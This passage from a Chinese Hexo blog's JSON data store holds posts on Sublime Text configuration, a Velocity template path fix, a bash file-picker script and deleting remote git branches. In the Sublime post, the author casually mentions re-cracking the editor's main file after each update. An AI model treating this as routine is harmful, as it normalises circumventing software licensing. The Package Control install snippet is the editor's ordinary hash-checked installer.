false,\n\n\t//滚动能否超过结尾\n\t\"scroll_past_end\": false,\n\n\t// TAB缩进宽度\n\t\"tab_size\": 4,\n\n\t// 自动转换TAB为空格\n\t\"translate_tabs_to_spaces\": false,\n\n\t// 皮肤\n\t\"theme\": \"Soda Dark 3.sublime-theme\",\n\n\t// 关闭自动更新\n\t\"update_check\": false,\n\n\t// 自动换行\n\t\"word_wrap\": \"true\"\n}\n```\n\n### 2. 关闭自动更新\nSublimeText的升级挺快的，每次升级完之后都要重新破解一次主文件，不用重新注册，如果嫌更新太麻烦可以在用户配置中加入如下配置禁用自动更新：\n``` json\n\"update_check\": false\n```\n\n### 3. soda主题\n参见：https://github.com/buymeasoda/soda-theme/\n\n通过package controller安装Theme - Soda。\n\n### 4. 记住打开的文件\n``` json\n\"remember_open_files\": false\n```\n\n<!-- more -->\n\n### 5. Sublime Text 2 使用 Eclipse 快捷键\n[Sublime Text User Preferences -- Eclipse shortcuts for Sublime Text](https://gist.github.com/ufologist/5590481#file-package-control-sublime-settings)\n[打造属于自己的前端开发神器 -- 给Sublime Text加上Eclipse的光环](http://www.douban.com/note/276794943/)\n\n``` json\n[\n    /**\n     * 常用快捷键(Sublime默认)\n     * --------------\n     * \n     * 光标一个单词一个单词的移动\n     * { \"keys\": [\"super+left\"], \"command\": \"move\", \"args\": {\"by\": \"words\", \"forward\": false} },\n     * 按住shift来选文字时, 一个个单词的选而不是一个个字母\n     * { \"keys\": [\"super+shift+left\"], \"command\": \"move\", \"args\": {\"by\": \"words\", \"forward\": false, \"extend\": true} },\n     *\n     * 类似光标一个个单词的移动\n     * { \"keys\": [\"alt+left\"], \"command\": \"move\", \"args\": {\"by\": \"subwords\", \"forward\": false} },\n     * { \"keys\": [\"alt+shift+right\"], \"command\": \"move\", \"args\": {\"by\": \"subword_ends\", \"forward\": true, \"extend\": true} },\n     *\n     * 缩进\n     * { \"keys\": [\"super+]\"], \"command\": \"indent\" },\n     * { \"keys\": [\"super+[\"], \"command\": \"unindent\" },\n     *\n     * 删除整个单词\n     * { \"keys\": [\"super+backspace\"], \"command\": \"delete_word\", \"args\": { \"forward\": false } },\n     * { \"keys\": [\"super+delete\"], \"command\": \"delete_word\", \"args\": { \"forward\": true } },\n     *\n     * 行排序(例如选中几个JSON字段, 让这些字段名按字母顺序排序)\n     * { \"keys\": [\"f9\"], \"command\": \"sort_lines\", \"args\": {\"case_sensitive\": false} },\n     *\n     * 参考\n     * ----------------------\n     * Using Sublime Text as your IDE\n     * http://www.chromium.org/developers/sublime-text\n     *\n     * Web Development With Sublime Text 2\n     * http://www.paulund.co.uk/web-development-with-sublime-text-2\n     */\n\n    // editor配置\n    { \"keys\": [\"super+v\"], \"command\": \"paste_and_indent\" },\n    { \"keys\": [\"super+shift+v\"], \"command\": \"paste\" },\n\n    /**\n     * 适配eclipse快捷键\n     *\n     * 下面这位仁兄早就有了这个想法\n     * Eclipse shortcuts for Sublime Text 2\n     * http://icoloma.blogspot.com/2011/10/eclipse-shortcuts-for-sublime-text-2.html\n     */\n    { \"keys\": [\"alt+/\"], \"command\": \"auto_complete\" },\n    { \"keys\": [\"super+i\"], \"command\": \"reindent\" },\n    // 当前行和下面一行交互位置\n    { \"keys\": [\"alt+up\"], \"command\": \"swap_line_up\" },\n    { \"keys\": [\"alt+down\"], \"command\": \"swap_line_down\" },\n    // 复制当前行到上一行\n    { \"keys\": [\"super+alt+up\"], \"command\": \"duplicate_line\" },\n    // 复制当前行到下一行\n    { \"keys\": [\"super+alt+down\"], \"command\": \"duplicate_line\" },\n    // 删除整行\n    { \"keys\": [\"super+d\"], \"command\": \"run_macro_file\", \"args\": {\"file\": \"Packages/Default/Delete Line.sublime-macro\"} },\n    // 光标移动到指定行\n    { \"keys\": [\"super+l\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \":\"} },\n    // 快速定位到选中的文字\n    { \"keys\": [\"super+k\"], \"command\": \"find_under_expand_skip\" },\n    // { \"keys\": [\"super+shift+x\"], \"command\": \"swap_case\" },\n    { \"keys\": [\"super+shift+x\"], \"command\": \"upper_case\" },\n    { \"keys\": [\"super+shift+y\"], \"command\": \"lower_case\" },\n    // 在当前行的下一行插入空行(这时鼠标可以在当前行的任一位置, 不一定是最后)\n    { \"keys\": [\"shift+enter\"], \"command\": \"run_macro_file\", \"args\": {\"file\": \"Packages/Default/Add Line.sublime-macro\"} },\n    // 定位到对于的匹配符(譬如{})(从前面定位后面时,光标要在匹配符里面,后面到前面,则反之)\n    { \"keys\": [\"super+shift+p\"], \"command\": \"move_to\", \"args\": {\"to\": \"brackets\"} },\n    // 这个命令默认使用的是super+shift+p\n    { \"keys\": [\"super+p\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"command_palette\"} },\n    // outline\n    { \"keys\": [\"super+o\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \"@\"} },\n    // 当前文件中的关键字(方便快速查找内容)\n    { \"keys\": [\"super+alt+o\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \"#\"} },\n    // open resource\n    { \"keys\": [\"super+shift+r\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"show_files\": true} },\n    // 文件内查找/替换\n    { \"keys\": [\"super+f\"], \"command\": \"show_panel\", \"args\": {\"panel\": \"replace\"} },\n    // 全局查找/替换, 在查询结果中双击跳转到匹配位置\n    {\"keys\": [\"super+h\"], \"command\": \"show_panel\", \"args\": {\"panel\": \"find_in_files\"} },\n\n    // plugin配置\n    { \"keys\": [\"alt+a\"], \"command\": \"alignment\" },\n    {\"keys\": [\"super+shift+f\"], \"command\": \"js_format\"}\n]\n```\n\n## 三、插件\n\n### 1. Package Control\n最简单的方式是通过 ctrl+\\`快捷键打开控制台，粘贴以下代码到控制台执行。\n参见：[Package Control INSTALLATION](https://packagecontrol.io/installation#st3)\n\n#### Sublime Text 3\n``` python\nimport urllib.request,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by)\n```\n\n#### Sublime Text 2\n``` python\nimport urllib2,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), 'wb' ).write(by) if dh == h else None; print('Error validating download (got %s instead of %s), please try manual install' % (dh, h) if dh != h else 'Please restart Sublime Text to finish installation')\n```\n\n### 2. 实用插件\n- SideBarEnhancements左侧菜单栏增强\n- ConvertToUTF8\n- AutoFileName自动补全文件(目录)名\n- BracketHighlighter突出显示括号/引号\n- ColorHighlighter 背景显示16进制颜色\n- DocBlockr 生成注释模板\n- Sublime CodeIntel – 智能代码提示\n- FreeMarker:Freemarker模板语言辅助\n- SublimeCodeIntel 代码提示\n- JSHint、JsFormart、jQuery\n- Color Highlighter\n- Indent XML\n- sublimeLinter\n- pretty json\n\n\n参见：\n - [sublime Text3配置及快捷键、插件推荐总结](http://blog.csdn.net/xby1993/article/details/23995667)\n - [SublimeText2 快捷键一览表](http://blog.useasp.net/archive/2013/06/14/sublime-text-2-all-default-Shortcuts-table-on-windows-translated-with-chinese.aspx)\n\n","slug":"article/mac/打造个人专属Sublime Text 3","published":1,"updated":"2016-04-06T08:35:52.000Z","_id":"cimfyqf0p001atjbth40bxdxr","comments":1,"layout":"post","photos":[],"link":""},{"title":"velocity宏文件macro.vm缺失","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/velocity.jpg\" class=\"img-logo img-center\" />\n\n\n异常描述：VelocityException: Velocimacro : Error using VM library : /WEB-INF/vm/macro.vm\n问题原因：路径配置错误。\n\n\n## 一、项目相关配置\n\n### 1. spring-beans.xml\nspring bean velocityEngine\n``` xml\n  <bean id=\"velocityEngine\" class=\"org.springframework.ui.velocity.VelocityEngineFactoryBean\">\n    <property name=\"resourceLoaderPath\" value=\"/WEB-INF/vm/\"/>\n    <property name=\"configLocation\" value=\"classpath:velocity.properties\"/>\n  </bean>\n```\n\n### 2. velocity.properties\n宏资源文件配置\n``` properties\nvelocimacro.library=/WEB-INF/vm/macro.vm\n```\n\n\n<!-- more -->\n\n\n## 二、解析异常原因\n首先，默认velocity模板加载方式为file，对应的资源加载类为：`org.apache.velocity.runtime.resource.loader.FileResourceLoader`。参见如下 **模板加载配置** 以及 **FileResourceLoader说明** 。\n\n从模板目录/WEB-INF/vm/加载模块文件(`ResourceManagerImpl.getResource`)。\n\n如果模板文件没有缓存(`ResourceManagerImpl.globalCacheglobalCache`)，则从目录文件中加载(`ResourceManagerImpl.loadResource`)。\n\n加载过程中，加载资源文件流，解析并初始化。`org.apache.velocity.Template.process()`\n此时，调用资源文件加载类FileResourceLoader加载文件。\n\nFileResourceLoader在file.resource.loader.path目录，即spring-beans.xml中配置的resourceLoaderPath目录通过模板名查找并加载模板。\n如果resourceLoaderPath未配置或者为空的话，则通过绝对路径加载模板；否则，相对于resourceLoaderPath查找模板。\n如果resourceLoaderPath不为空，模板路径velocimacro.library以/开头，则直接去除/。\n\n### 模板加载配置\n默认的velocity.properties in package `org.apache.velocity.runtime.defaults`。\n``` properties\nresource.loader = file\n\nfile.resource.loader.description = Velocity File Resource Loader\nfile.resource.loader.class = org.apache.velocity.runtime.resource.loader.FileResourceLoader\nfile.resource.loader.path = .\nfile.resource.loader.cache = false\nfile.resource.loader.modificationCheckInterval = 2\n```\n\n### FileResourceLoader说明\nA loader for templates stored on the file system. Treats the template as relative to the configured root path. If the root path is empty treats the template name as an absolute path.\n\n\n## 三、小结\n因此，对于当前的项目配置来说，velocity框架实际上是在/WEB-INF/vm/WEB-INF/vm/macro.vm目录加载模板文件macro.vm。\n\n**注**：如果希望在class目录加载模板文件，可以考试设置资源文件加载类为：org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader。\n\n修改velocity.properties配置：\n``` properties\nresource.loader = class\nclass.resource.loader.class = org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader\n\nvelocimacro.library=macro.vm\n```\n\n## 四、参考文档\nhttp://stackoverflow.com/questions/3443819/velocity-cant-find-resource\nhttp://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders\nhttp://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html","source":"_posts/article/java/velocity宏文件macro.vm缺失.md","raw":"tags:\n  - velocity\n  - java\ntitle: velocity宏文件macro.vm缺失\ncategories:\n  - 后端开发\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/velocity.jpg\" class=\"img-logo img-center\" />\n\n\n异常描述：VelocityException: Velocimacro : Error using VM library : /WEB-INF/vm/macro.vm\n问题原因：路径配置错误。\n\n\n## 一、项目相关配置\n\n### 1. spring-beans.xml\nspring bean velocityEngine\n``` xml\n  <bean id=\"velocityEngine\" class=\"org.springframework.ui.velocity.VelocityEngineFactoryBean\">\n    <property name=\"resourceLoaderPath\" value=\"/WEB-INF/vm/\"/>\n    <property name=\"configLocation\" value=\"classpath:velocity.properties\"/>\n  </bean>\n```\n\n### 2. velocity.properties\n宏资源文件配置\n``` properties\nvelocimacro.library=/WEB-INF/vm/macro.vm\n```\n\n\n<!-- more -->\n\n\n## 二、解析异常原因\n首先，默认velocity模板加载方式为file，对应的资源加载类为：`org.apache.velocity.runtime.resource.loader.FileResourceLoader`。参见如下 **模板加载配置** 以及 **FileResourceLoader说明** 。\n\n从模板目录/WEB-INF/vm/加载模块文件(`ResourceManagerImpl.getResource`)。\n\n如果模板文件没有缓存(`ResourceManagerImpl.globalCacheglobalCache`)，则从目录文件中加载(`ResourceManagerImpl.loadResource`)。\n\n加载过程中，加载资源文件流，解析并初始化。`org.apache.velocity.Template.process()`\n此时，调用资源文件加载类FileResourceLoader加载文件。\n\nFileResourceLoader在file.resource.loader.path目录，即spring-beans.xml中配置的resourceLoaderPath目录通过模板名查找并加载模板。\n如果resourceLoaderPath未配置或者为空的话，则通过绝对路径加载模板；否则，相对于resourceLoaderPath查找模板。\n如果resourceLoaderPath不为空，模板路径velocimacro.library以/开头，则直接去除/。\n\n### 模板加载配置\n默认的velocity.properties in package `org.apache.velocity.runtime.defaults`。\n``` properties\nresource.loader = file\n\nfile.resource.loader.description = Velocity File Resource Loader\nfile.resource.loader.class = org.apache.velocity.runtime.resource.loader.FileResourceLoader\nfile.resource.loader.path = .\nfile.resource.loader.cache = false\nfile.resource.loader.modificationCheckInterval = 2\n```\n\n### FileResourceLoader说明\nA loader for templates stored on the file system. Treats the template as relative to the configured root path. If the root path is empty treats the template name as an absolute path.\n\n\n## 三、小结\n因此，对于当前的项目配置来说，velocity框架实际上是在/WEB-INF/vm/WEB-INF/vm/macro.vm目录加载模板文件macro.vm。\n\n**注**：如果希望在class目录加载模板文件，可以考试设置资源文件加载类为：org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader。\n\n修改velocity.properties配置：\n``` properties\nresource.loader = class\nclass.resource.loader.class = org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader\n\nvelocimacro.library=macro.vm\n```\n\n## 四、参考文档\nhttp://stackoverflow.com/questions/3443819/velocity-cant-find-resource\nhttp://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders\nhttp://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html","slug":"article/java/velocity宏文件macro.vm缺失","published":1,"updated":"2016-03-31T15:30:44.000Z","_id":"cimfz5lb60033tjbt9lssvehz","comments":1,"layout":"post","photos":[],"link":""},{"title":"文件遍历选取脚本","date":"2016-02-01T10:32:00.000Z","_content":"\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、脚本说明\n\n### 1. 应用场景\n身为QA的女友，有一堆自动化的测试用例跑，随着自动化case的增加，导致每次回归测试过程时间过长。\n有些时候上线功能只是修改了某些业务逻辑，仅仅只需要执行一部分case即可。\n因此，需要从一堆现有case里选取若干文件即可。\n\n### 2. 脚本内容\n脚本主要分为二部分内容：文件遍历和文件选择。\n\n文件遍历：将指定路径下特定后缀的case选取出来，存入到数组files中，并以序号、数组内容格式输出。\n文件选择：等待用户输入序号(多个使用空格隔开)，然后根据用户输入的多个序号从数组files中选取对应的文件即可。\n\n\n## 二、选取脚本\n\n### 1. 脚本源码\n``` bash\n#!/bin/bash\n\nBASE_PATH=/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article\nFEATURE='*.md'\n\nif [[ $# -ge 1 && $1 != '-' ]]\nthen\n\tBASE_PATH=$1\nfi\n\nif [[ $# -ge 2 && $2 != '-' ]]\nthen\n\tFEATURE=$2\nfi\n\necho \"BASE_PATH: $BASE_PATH\"\necho \"FEATURE: $FEATURE\"\n\ndeclare -a files\n\n# 文件遍历\nfunction file_traverse {\n    echo \"-----------------------------------------\"\n    IFS=$'\\n'\n    #echo -n \"$IFS\" | od -b\n\n\n    files=($(find $BASE_PATH -name \"$FEATURE\"))\n    for str in ${!files[@]}\n    do\n        echo -e \"$str\\t${files[$str]}\"\n    done\n}\n\n# 文件选择\nfunction choose_file {\n    echo \"-----------------------------------------\"\n    read -p \"请通过序号选择文件：\" ids\n    echo \"你选择的序号为：${ids[@]}\"\n\n\n    IFS=$' \\t'\n    for id in ${ids[@]}\n    do\n        if [ $id -lt ${#files[@]} ]\n        then\n            echo \"文件: \"${files[$id]}\n        fi\n    done\n}\n\n\nfile_traverse\nchoose_file\n\n```\n\n\n### 2. 脚本输出\n``` bash\nyerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nBASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nFEATURE: *.md\nyerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nBASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nFEATURE: *.md\n-----------------------------------------\n0\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/shell关联数组基本用法.md\n1\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/了解IFS.md\n2\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/遍历博客文章.md\n-----------------------------------------\n请通过序号选择文件：2 0\n你选择的序号为：2 0\n文件: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/遍历博客文章.md\n文件: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/shell关联数组基本用法.md\n```","source":"_posts/article/shell/文件遍历选取脚本.md","raw":"title: 文件遍历选取脚本\ntags:\n  - 实践\n  - shell\ncategories:\n  - 脚本\ndate: 2016-02-01 18:32:00\n---\n\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、脚本说明\n\n### 1. 应用场景\n身为QA的女友，有一堆自动化的测试用例跑，随着自动化case的增加，导致每次回归测试过程时间过长。\n有些时候上线功能只是修改了某些业务逻辑，仅仅只需要执行一部分case即可。\n因此，需要从一堆现有case里选取若干文件即可。\n\n### 2. 脚本内容\n脚本主要分为二部分内容：文件遍历和文件选择。\n\n文件遍历：将指定路径下特定后缀的case选取出来，存入到数组files中，并以序号、数组内容格式输出。\n文件选择：等待用户输入序号(多个使用空格隔开)，然后根据用户输入的多个序号从数组files中选取对应的文件即可。\n\n\n## 二、选取脚本\n\n### 1. 脚本源码\n``` bash\n#!/bin/bash\n\nBASE_PATH=/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article\nFEATURE='*.md'\n\nif [[ $# -ge 1 && $1 != '-' ]]\nthen\n\tBASE_PATH=$1\nfi\n\nif [[ $# -ge 2 && $2 != '-' ]]\nthen\n\tFEATURE=$2\nfi\n\necho \"BASE_PATH: $BASE_PATH\"\necho \"FEATURE: $FEATURE\"\n\ndeclare -a files\n\n# 文件遍历\nfunction file_traverse {\n    echo \"-----------------------------------------\"\n    IFS=$'\\n'\n    #echo -n \"$IFS\" | od -b\n\n\n    files=($(find $BASE_PATH -name \"$FEATURE\"))\n    for str in ${!files[@]}\n    do\n        echo -e \"$str\\t${files[$str]}\"\n    done\n}\n\n# 文件选择\nfunction choose_file {\n    echo \"-----------------------------------------\"\n    read -p \"请通过序号选择文件：\" ids\n    echo \"你选择的序号为：${ids[@]}\"\n\n\n    IFS=$' \\t'\n    for id in ${ids[@]}\n    do\n        if [ $id -lt ${#files[@]} ]\n        then\n            echo \"文件: \"${files[$id]}\n        fi\n    done\n}\n\n\nfile_traverse\nchoose_file\n\n```\n\n\n### 2. 脚本输出\n``` bash\nyerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nBASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nFEATURE: *.md\nyerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nBASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nFEATURE: *.md\n-----------------------------------------\n0\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/shell关联数组基本用法.md\n1\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/了解IFS.md\n2\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/遍历博客文章.md\n-----------------------------------------\n请通过序号选择文件：2 0\n你选择的序号为：2 0\n文件: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/遍历博客文章.md\n文件: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/shell关联数组基本用法.md\n```","slug":"article/shell/文件遍历选取脚本","published":1,"updated":"2016-04-06T07:55:37.000Z","_id":"cimfzf092003htjbt46bm6v76","comments":1,"layout":"post","photos":[],"link":""},{"date":"2016-03-11T10:33:26.000Z","_content":"\n# git删除远程分支\n\n如果不再需要某个远程分支了，比如搞定了某个特性并把它合并进了远程的 master 分支（或任何其他存放稳定代码的分支），可以用这个非常无厘头的语法来删除它：git push [远程名] :[分支名]。如果想在服务器上删除 serverfix 分支，运行下面的命令：\n\n``` bash\n$ git push origin :serverfix\nTo git@github.com:schacon/simplegit.git\n - [deleted]         serverfix\n```\n\n咚！服务器上的分支没了。你最好特别留心这一页，因为你一定会用到那个命令，而且你很可能会忘掉它的语法。有种方便记忆这条命令的方法：记住我们不久前见过的 git push [远程名] [本地分支]:[远程分支] 语法，如果省略 [本地分支]，那就等于是在说“在这里提取空白然后把它变成[远程分支]”。\n","source":"_drafts/article/git/git删除远程分支.md","raw":"date: 2016-03-11 18:33:26\n---\n\n# git删除远程分支\n\n如果不再需要某个远程分支了，比如搞定了某个特性并把它合并进了远程的 master 分支（或任何其他存放稳定代码的分支），可以用这个非常无厘头的语法来删除它：git push [远程名] :[分支名]。如果想在服务器上删除 serverfix 分支，运行下面的命令：\n\n``` bash\n$ git push origin :serverfix\nTo git@github.com:schacon/simplegit.git\n - [deleted]         serverfix\n```\n\n咚！服务器上的分支没了。你最好特别留心这一页，因为你一定会用到那个命令，而且你很可能会忘掉它的语法。有种方便记忆这条命令的方法：记住我们不久前见过的 git push [远程名] [本地分支]:[远程分支] 语法，如果省略 [本地分支]，那就等于是在说“在这里提取空白然后把它变成[远程分支]”。\n","slug":"article/git/git删除远程分支","published":0,"updated":"2016-03-31T07:51:26.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cimfzfwq5003itjbtzc0xc4hg"}],"PostAsset":[],"PostCategory":[{"post_id":"cilpxkgcu0064avbt6w1zy3mp","category_id":"cilpxkgcv0065avbtp9bhn5an","_id":"cilpxkgcv0067avbtf3790cnf"},{"post_id":"cilpxkgcw0068avbtwx3hvkvo","category_id":"cilpxkgcn005zavbts4obb4rh","_id":"cilpxkgcx0069avbte5tdqbbn"},{"post_id":"cilpxkgcm005yavbti29tmcm8","category_id":"cimfy8niq0000tjbtqi4qzub8","_id":"cimfy8zik0003tjbt7b9lio2n"},{"post_id":"cimfydoaj000jtjbtsela96b9","category_id":"cimfygoh0000qtjbtu245fkqc","_id":"cimfygvbe000stjbtlfpdymn0"},{"post_id":"cimfypx1u000ytjbtxfsfas7q","category_id":"cimfygoh0000qtjbtu245fkqc","_id":"cimfypx1x000ztjbt21zlahgd"},{"post_id":"cimfyq40o0012tjbt92aworro","category_id":"cimfygoh0000qtjbtu245fkqc","_id":"cimfyq40p0013tjbt5copn6uj"},{"post_id":"cimfyqaae0016tjbtcprgmiy8","category_id":"cimfygoh0000qtjbtu245fkqc","_id":"cimfyqaaf0017tjbt1wcrz0xe"},{"post_id":"cilpxkgal002qavbtycl7cnbo","category_id":"cimfygoh0000qtjbtu245fkqc","_id":"cimfywilr001ztjbtfkjzkbny"},{"post_id":"cilpxkga8001yavbt6bwpn9kg","category_id":"cilpxkga9001zavbtb5t6zfah","_id":"cimgbxl3o000290btudyi568f"},{"post_id":"cilpxkgb0003havbt4ao8qpty","category_id":"cilpxkgaz003davbtrkbl2cqg","_id":"cimgeybvj0001ecbtoh3c0rg0"},{"post_id":"cilpxkgb4003lavbthxwelj5p","category_id":"cilpxkgaz003davbtrkbl2cqg","_id":"cimgeybvm0002ecbtrto36gzb"},{"post_id":"cilpxkgb9003pavbtu7xqhaar","category_id":"cilpxkgaz003davbtrkbl2cqg","_id":"cimgeybvq0003ecbtcqkvpoue"},{"post_id":"cilpxkgbs004mavbtmc0lhfoz","category_id":"cimfya2bi0006tjbtmgvk8nm4","_id":"cimgezcyx0005ecbtxj7ehxcc"},{"post_id":"cilpxkgbu004savbtsfaowqa5","category_id":"cimfya2bi0006tjbtmgvk8nm4","_id":"cimgezhll0007ecbtjfwc0o57"},{"post_id":"cilpxkgby004zavbt2dc9an2o","category_id":"cimfya2bi0006tjbtmgvk8nm4","_id":"cimgezviv0008ecbtsfxfon5q"},{"post_id":"cilpxkgc00052avbt7ujlpb1i","category_id":"cimfya2bi0006tjbtmgvk8nm4","_id":"cimgezxxj0009ecbt70dl7uwp"},{"post_id":"cilpxkgbl0049avbthwd2eksz","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgf0zk7000decbtfxsmqoi5"},{"post_id":"cilpxkgbi0041avbtbr6a88el","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgf13bx000eecbti5l0sbff"},{"post_id":"cilpxkgbc003tavbtocfc0gow","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgf15xh000fecbtd7en05ib"},{"post_id":"cimfwfql00001tcbt8b8ayye1","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgf1b44000hecbtvew5vxo2"},{"post_id":"cilpxkgbg003xavbteo4rheg3","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgf1dna000iecbtdqy8uh0y"},{"post_id":"cilpxkgbk0045avbtk3zviy2e","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgf1g6m000jecbtvz4dght6"},{"post_id":"cilpybfby0000hnbt6x16sks9","category_id":"cimfz9ngs003etjbt5hemhbrc","_id":"cimgf246y000kecbt5gc6h6op"},{"post_id":"cilpxkgaw0037avbtrld2mjoh","category_id":"cimfz9ngs003etjbt5hemhbrc","_id":"cimgf292s000mecbtdkfrckzb"},{"post_id":"cilpxkgca005gavbt7w9nndm8","category_id":"cilpxkgc50059avbtjw6bfq95","_id":"cimgf8bv80001g9bt0dw5einb"},{"post_id":"cilpxkgch005mavbty17q9awb","category_id":"cilpxkgc50059avbtjw6bfq95","_id":"cimgf8gy80002g9bt1jiud0gt"},{"post_id":"cilpxkgc7005davbtasqi0jlz","category_id":"cilpxkgc50059avbtjw6bfq95","_id":"cimgf8jb50003g9bt8f6cmkvw"},{"post_id":"cilpxkgc40058avbta99weoib","category_id":"cilpxkgc50059avbtjw6bfq95","_id":"cimgf8ln20004g9btpf7a9imw"},{"post_id":"cilpxkgce005javbtqbxjkjbb","category_id":"cilpxkgc50059avbtjw6bfq95","_id":"cimgf8o0p0005g9btuq5vyjfy"},{"post_id":"cilpxkgah002kavbts3pv62wk","category_id":"cimfygoh0000qtjbtu245fkqc","_id":"cimgfiqdk0001i4btr087scb3"},{"post_id":"cilpxkgat0032avbt2ly11s5r","category_id":"cimfygoh0000qtjbtu245fkqc","_id":"cimgfiv520002i4btjfahlbm0"},{"post_id":"cilpxkgar002zavbtgjn9l66z","category_id":"cimfyvn6r001ttjbtlpkxbg3y","_id":"cimgfix7y0003i4bt1sk953ch"},{"post_id":"cilpxkgap002wavbto2aw54dx","category_id":"cimfyvn6r001ttjbtlpkxbg3y","_id":"cimgfizvm0004i4btm3jkejmg"},{"post_id":"cilpxkgaf002eavbtk4f72i76","category_id":"cimfygoh0000qtjbtu245fkqc","_id":"cimgfji8h0006i4bt6chhvj2m"},{"post_id":"cilpxkgad0027avbtqszo3kjb","category_id":"cimfygoh0000qtjbtu245fkqc","_id":"cimgfjmju0007i4bt5kksgtcs"},{"post_id":"cilpxkg9a000javbt10t86odn","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgfmlwg0000kvbt5dmpv3m8"},{"post_id":"cilpxkg9h000vavbt24pbx5w4","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgfmp9q0001kvbt08n7goio"},{"post_id":"cilpxkg9l0011avbt847x46qt","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgfms8l0002kvbt68kpcec6"},{"post_id":"cilpxkg9o0016avbt3eubyi9k","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgfmujf0003kvbtexwk8yrd"},{"post_id":"cilpxkg9t001gavbt2gy57ci7","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgfmx040004kvbta5b7aadd"},{"post_id":"cilpxkg9e000ravbtvqqasmcm","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgfmzfn0005kvbtg6e88s13"},{"post_id":"cilpxkg9r001aavbt86u2whl0","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgfn3uc0006kvbth5x3c9ec"},{"post_id":"cimfz5lb60033tjbt9lssvehz","category_id":"cimfz2bmp0026tjbtxumij3vj","_id":"cimgfuwif0000ozbtpr6v7hxq"},{"post_id":"cilpxkgay003cavbtqjiu2s8r","category_id":"cilpxkgaz003davbtrkbl2cqg","_id":"cimggdqhs0000v6bt2646y7a4"},{"post_id":"cimfzf092003htjbt46bm6v76","category_id":"cimfz6kc40037tjbtsto9ydzw","_id":"cimok9xr30000l0btuy4vzedz"},{"post_id":"cilpxkg9y001javbtb8h16tw3","category_id":"cimfz6kc40037tjbtsto9ydzw","_id":"cimok9xrm0003l0btz28l9jps"},{"post_id":"cilpxkga3001savbtp3hccgad","category_id":"cimfz6kc40037tjbtsto9ydzw","_